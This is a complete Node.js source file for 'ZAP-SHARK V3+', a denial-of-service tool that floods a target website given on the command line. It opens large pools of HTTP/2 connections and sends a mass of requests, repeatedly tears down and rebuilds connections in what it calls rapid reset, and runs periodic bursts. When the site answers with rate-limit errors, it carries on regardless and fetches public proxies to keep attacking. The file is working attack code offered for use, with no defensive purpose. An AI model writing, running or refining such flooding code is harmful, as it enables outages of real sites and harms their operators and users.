const http2 = require('http2');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK_V3_PLUS {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.mode = "NORMAL";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        this.wifiConnected = true;
        this.usingProxy = false;
        
        // AGGRESSIVE CONNECTION POOL
        this.connectionPool = [];
        this.activeStreams = 0;
        this.poolSize = 15; // TRIPLED from V3
        this.maxStreamsPerConn = 1000; // MAX H2 STREAMS
        
        // NO HEADER ROTATION (MINIMAL OVERHEAD)
        this.minimalHeaders = {
            ':method': 'GET',
            ':path': '/',
            ':authority': this.hostname,
            'user-agent': 'Mozilla/5.0',
            'accept': '*/*'
        };
        
        // PROXY SYSTEM (ONLY IF NEEDED)
        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all';
        this.currentProxy = null;
        this.proxyExpiry = 0;
        this.rateLimitCount = 0;
        
        // AGGRESSIVE TIMING
        this.attackInterval = null;
        this.burstInterval = null;
        this.lastConnectionReset = Date.now();
    }

    // === WIFI CHECK ===
    checkWifi() {
        const interfaces = os.networkInterfaces();
        for (const iface in interfaces) {
            for (const config of interfaces[iface]) {
                if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
                    return true;
                }
            }
        }
        return false;
    }

    // === AGGRESSIVE CONNECTION SETUP ===
    setupConnections() {
        // DESTROY ALL OLD CONNECTIONS
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        
        // CREATE MAX CONNECTIONS
        for (let i = 0; i < this.poolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 65536, // DOUBLE MEMORY
                    maxDeflateDynamicTableSize: 4294967295,
                    peerMaxConcurrentStreams: 1000
                });
                
                client.setMaxListeners(1000);
                
                // REMOTE SETTINGS FOR MAX STREAMS
                client.on('remoteSettings', (settings) => {
                    if (settings.maxConcurrentStreams) {
                        this.maxStreamsPerConn = Math.max(this.maxStreamsPerConn, settings.maxConcurrentStreams);
                    }
                });
                
                // AGGRESSIVE CLIENT SETTINGS
                client.settings({
                    enablePush: false,
                    initialWindowSize: 16777215, // MAX WINDOW SIZE
                    maxConcurrentStreams: 1000
                });
                
                client.on('error', () => {
                    // QUICK RECONNECT
                    setTimeout(() => {
                        const index = this.connectionPool.indexOf(client);
                        if (index > -1) {
                            this.connectionPool.splice(index, 1);
                            this.createSingleConnection();
                        }
                    }, 50);
                });
                
                this.connectionPool.push(client);
                
            } catch (err) {
                // SILENT FAIL
            }
        }
    }

    createSingleConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 65536
            });
            client.setMaxListeners(1000);
            client.on('error', () => {});
            this.connectionPool.push(client);
        } catch (err) {}
    }

    // === AGGRESSIVE RAPID RESET ===
    resetConnections() {
        if (this.connectionPool.length > 0 && Date.now() - this.lastConnectionReset > 1000) {
            // RESET 30% OF CONNECTIONS EVERY SECOND
            const resetCount = Math.ceil(this.connectionPool.length * 0.3);
            
            for (let i = 0; i < resetCount; i++) {
                if (this.connectionPool[i]) {
                    try {
                        this.connectionPool[i].destroy();
                        this.connectionPool[i] = this.createSingleConnection();
                    } catch (err) {}
                }
            }
            
            this.lastConnectionReset = Date.now();
        }
    }

    // === PURE MAX RPS REQUEST ===
    sendRequest() {
        if (!this.wifiConnected || this.connectionPool.length === 0) return;
        
        // RAPID RESET CHECK
        this.resetConnections();
        
        // CALCULATE MAX STREAMS WE CAN SEND
        const maxPossibleStreams = this.maxStreamsPerConn * this.connectionPool.length;
        const availableStreams = maxPossibleStreams - this.activeStreams;
        
        // AGGRESSIVE: USE 50% OF AVAILABLE STREAMS EACH TICK
        const streamsThisTick = Math.max(1, Math.floor(availableStreams * 0.5));
        
        for (let i = 0; i < streamsThisTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request(this.minimalHeaders);
                
                // ULTRA FAST RESPONSE HANDLING
                req.on('response', (headers) => {
                    // COUNT 429s BUT DON'T SLOW DOWN
                    if (headers[':status'] === '429') {
                        this.rateLimitCount++;
                        if (this.rateLimitCount > 10 && !this.usingProxy) {
                            this.activateProxyMode();
                        }
                    }
                    req.destroy();
                });
                
                req.on('error', () => {
                    req.destroy();
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    async activateProxyMode() {
        this.usingProxy = true;
        // SIMPLE PROXY FETCH - WON'T BLOCK MAIN THREAD
        https.get(this.proxyApi, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const proxies = data.trim().split('\n');
                if (proxies.length > 0) {
                    this.currentProxy = proxies[0].trim();
                    setTimeout(() => {
                        this.usingProxy = false;
                        this.rateLimitCount = 0;
                    }, 600000);
                }
            });
        }).on('error', () => {
            this.usingProxy = false;
        });
    }

    // === REAL RPS CALCULATION ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const connectionStatus = this.wifiConnected ? "CONNECTED" : "UNCONNECTED";
        const modeStatus = this.usingProxy ? "PROXY" : "DIRECT";
        
        // CLEAR AND OVERWRITE (NO SPAM)
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${this.formatRuntime()}) | STATUS: ${this.status}`);
        console.log('============================');
        console.log(`T-ARP — ${this.totalRequests}`);
        console.log(`T-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log('============================');
        console.log(`ZAP-SHARK — ${connectionStatus} | MODE: ${modeStatus}`);
    }

    // === AGGRESSIVE BURST SYSTEM ===
    activateBurstMode() {
        if (this.burstInterval) clearInterval(this.burstInterval);
        
        this.mode = "BURST";
        const oldPoolSize = this.poolSize;
        this.poolSize = 30; // DOUBLE DURING BURST
        
        this.setupConnections();
        
        // ULTRA AGGRESSIVE BURST
        this.burstInterval = setInterval(() => {
            if (this.status === "ATTACKING" && this.wifiConnected) {
                // SEND 10X REQUESTS DURING BURST
                for (let i = 0; i < 10; i++) {
                    this.sendRequest();
                }
                this.updateDisplay();
            }
        }, 0.01); // 100x FASTER THAN NORMAL
        
        // RETURN TO NORMAL AFTER 7s
        setTimeout(() => {
            clearInterval(this.burstInterval);
            this.mode = "NORMAL";
            this.poolSize = oldPoolSize;
            this.setupConnections();
        }, 7000);
    }

    // === MAIN ===
    start() {
        console.log("=== ZAP-SHARK V3+ - MAX AGGRESSION ===");
        console.log("Target:", this.targetUrl);
        console.log("Mode: PURE RPS | NO HEADERS | RAPID RESET");
        console.log("=".repeat(60));
        
        this.setupConnections();
        
        // INITIAL DISPLAY
        setTimeout(() => this.updateDisplay(), 1000);
        
        // MAIN ATTACK LOOP (AGGRESSIVE)
        setTimeout(() => {
            this.attackInterval = setInterval(() => {
                if (this.status === "ATTACKING" && this.wifiConnected) {
                    this.sendRequest();
                    this.updateDisplay();
                }
            }, 0.1); // FAST LOOP
            
            // RAPID BURST EVERY 30s
            setInterval(() => {
                if (this.status === "ATTACKING" && !this.usingProxy) {
                    this.activateBurstMode();
                }
            }, 30000);
            
            // WIFI CHECK
            setInterval(() => {
                this.wifiConnected = this.checkWifi();
                if (!this.wifiConnected) {
                    this.status = "PAUSED";
                } else if (this.status === "PAUSED") {
                    this.status = "ATTACKING";
                }
            }, 1000);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.burstInterval);
            console.log('\n=== ZAP-SHARK V3+ STOPPED ===');
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v3-plus.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V3_PLUS(target);
shark.start();
